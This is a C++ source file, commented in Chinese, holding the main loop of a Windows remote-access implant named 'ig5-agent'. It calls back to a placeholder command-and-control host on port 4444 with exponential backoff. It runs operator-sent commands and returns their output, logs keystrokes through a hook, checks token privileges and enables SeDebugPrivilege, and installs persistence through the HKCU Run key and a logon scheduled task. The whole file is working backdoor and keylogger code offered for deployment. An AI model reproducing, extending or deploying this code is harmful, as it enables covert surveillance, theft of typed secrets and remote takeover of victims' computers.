// main.cpp —— 调度循环：回连（指数退避）→ 解帧 → 按 opcode 分派 → 结果回送
#include "ig5_win.hpp"
#include <cstdio>
#include <cstring>
#include <string>
#include <thread>
#include <vector>

namespace {

// opcode 表（与 C2 侧常量一致）
constexpr std::uint16_t kOpPing        = 1;
constexpr std::uint16_t kOpKeyDrain    = 2;
constexpr std::uint16_t kOpTokenQuery  = 3;
constexpr std::uint16_t kOpExec        = 4;
constexpr std::uint16_t kOpPersistAdd  = 5;
constexpr std::uint16_t kOpPersistDel  = 6;
constexpr std::uint16_t kOpSleep       = 7;
constexpr std::uint16_t kOpExit        = 8;

ig5::Endpoint g_ep{ "HOST", 4444 };          // 占位符：部署时替换为实际 C2 端点
constexpr int kMaxBackoffMs = 60000;
constexpr int kConnTimeout  = 8000;

std::wstring widen(const std::string& s) {
    if (s.empty()) return {};
    const int need = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring w(need, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), w.data(), need);
    return w;
}
std::string narrow(const std::wstring& w) {
    if (w.empty()) return {};
    const int need = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s(need, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), s.data(), need, nullptr, nullptr);
    return s;
}
std::string hex_serial() { return "SERIAL"; }   // 占位符：每实例唯一标识

std::vector<std::uint8_t> reply_for(std::uint16_t op, const std::vector<std::uint8_t>& in, bool& keep_running) {
    std::string text;
    switch (op) {
    case kOpPing:
        text = "pong serial=" + hex_serial();
        break;
    case kOpKeyDrain: {
        const auto evs = ig5::hook_drain(256);
        text = "keystrokes=" + std::to_string(evs.size()) + " pending=" + std::to_string(ig5::hook_pending());
        for (const auto& e : evs) {
            text += "\n";
            text += std::to_string(e.vk); text += " "; text += (e.down ? "down" : "up");
            text += " t="; text += std::to_string(e.tick_ms);
        }
        break;
    }
    case kOpTokenQuery: {
        bool elevated = false, admin = false; std::string lvl, err;
        if (!ig5::token_is_elevated(elevated, err) || !ig5::token_integrity(lvl, err) ||
            !ig5::token_in_admin_group(admin, err))
            { text = "error: " + err; break; }
        bool dbg = false; std::wstring p = L"SeDebugPrivilege";
        std::string perr; ig5::token_enable(p, dbg, perr);
        text = "elevated=" + std::string(elevated ? "1" : "0") + " integrity=" + lvl +
               " admin_group=" + std::string(admin ? "1" : "0") +
               " SeDebugPrivilege=" + std::string(dbg ? "enabled" : "absent");
        break;
    }
    case kOpExec: {
        std::string out, err;
        const std::wstring cmd = widen(std::string(in.begin(), in.end()));
        if (cmd.empty()) { text = "error: empty command"; break; }
        if (!ig5::run_capture(cmd, out, err, 15000)) text = "error: " + err;
        else text = out;
        break;
    }
    case kOpPersistAdd: {
        wchar_t self[MAX_PATH]{};
        GetModuleFileNameW(nullptr, self, MAX_PATH);
        std::string err;
        const bool a = ig5::persist_registry_run(self, L"ig5-agent", err);
        text = std::string("HKCU\\Run=") + (a ? "ok" : err);
        if (a) {
            std::string err2;
            const bool b = ig5::persist_schtask_onlogon(self, L"ig5-agent-logon", err2);
            text += std::string(" schtask=") + (b ? "ok" : err2);
        }
        break;
    }
    case kOpPersistDel: {
        std::string e1, e2;
        const bool a = ig5::persist_remove_run(L"ig5-agent", e1);
        const bool b = ig5::persist_remove_task(L"ig5-agent-logon", e2);
        text = std::string("run=") + (a ? "removed" : e1) + " task=" + (b ? "removed" : e2);
        break;
    }
    case kOpSleep: {
        int ms = 1000;
        if (in.size() >= 4) std::memcpy(&ms, in.data(), 4);
        text = "sleep_ms=" + std::to_string(ms);
        break;
    }
    case kOpExit:
        keep_running = false;
        text = "bye";
        break;
    default:
        text = "unknown opcode=" + std::to_string(op);
        break;
    }
    return std::vector<std::uint8_t>(text.begin(), text.end());
}

}  // namespace

int main() {
    std::string err;
    if (!ig5::win_net_startup(err)) { std::fprintf(stderr, "%s\n", err.c_str()); return 2; }
    if (!ig5::hook_install(err)) std::fprintf(stderr, "hook: %s (继续以无采集模式运行)\n", err.c_str());

    std::atomic<bool> stop{false};
    std::thread input_thread([&stop] { ig5::hook_run_message_loop(stop, 15); });

    bool running = true;
    int backoff = 1000;
    while (running) {
        ig5::SocketLink link;
        if (!link.connect_to(g_ep, kConnTimeout, err)) {
            std::fprintf(stderr, "connect: %s (退避 %dms)\n", err.c_str(), backoff);
            Sleep((DWORD)backoff);
            backoff = backoff * 2 > kMaxBackoffMs ? kMaxBackoffMs : backoff * 2;
            continue;
        }
        backoff = 1000;                                  // 连上即复位

        const std::string hello = "HELLO ig5-agent serial=" + hex_serial();
        auto wire = ig5::encode_frame(ig5::Frame{ kOpPing, 0, { hello.begin(), hello.end() } });
        if (!link.send_all(wire, err)) { std::fprintf(stderr, "%s\n", err.c_str()); continue; }

        ig5::FrameDecoder dec;
        std::vector<std::uint8_t> buf(4096);
        while (running) {
            const int n = link.recv_some(buf, 1000, err);
            if (n == -2) continue;                       // 空闲：回到循环顶部，便于检查 stop
            if (n < 0)   { std::fprintf(stderr, "%s\n", err.c_str()); break; }
            if (n == 0)  break;                          // 对端关闭
            dec.feed(std::span<const std::uint8_t>(buf.data(), (std::size_t)n));
            while (auto f = dec.next()) {
                bool keep = true;
                auto reply = reply_for(f->opcode, f->payload, keep);
                auto out = ig5::encode_frame(ig5::Frame{ f->opcode, 0, reply });
                if (!link.send_all(out, err)) { std::fprintf(stderr, "%s\n", err.c_str()); break; }
                if (!keep) running = false;
            }
            if (!dec.last_error().empty()) std::fprintf(stderr, "proto: %s\n", dec.last_error().c_str());
        }
    }

    stop.store(true);
    if (input_thread.joinable()) input_thread.join();
    ig5::hook_uninstall();
    ig5::win_net_shutdown();
    return 0;
}
